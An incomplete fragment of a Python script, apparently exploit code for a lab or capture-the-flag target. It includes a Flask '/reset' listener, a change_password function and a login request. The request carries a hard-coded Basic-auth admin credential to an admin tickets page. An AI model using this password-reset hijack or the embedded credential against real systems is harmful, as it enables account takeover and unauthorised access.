...
def change_password(token):
    ...
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Host":f"{host}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
...
def login():
    url = f"http://{host}/admin_tickets"
    headers = {"Authorization": "Basic YWRtaW46am9uYXRoYW4=", "Content-Type": "application/x-www-form-urlencoded", "Host": f"{host}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    res = requests.get(url, headers=headers)
    print(res.text)
app = Flask(__name__)
@app.route("/reset")
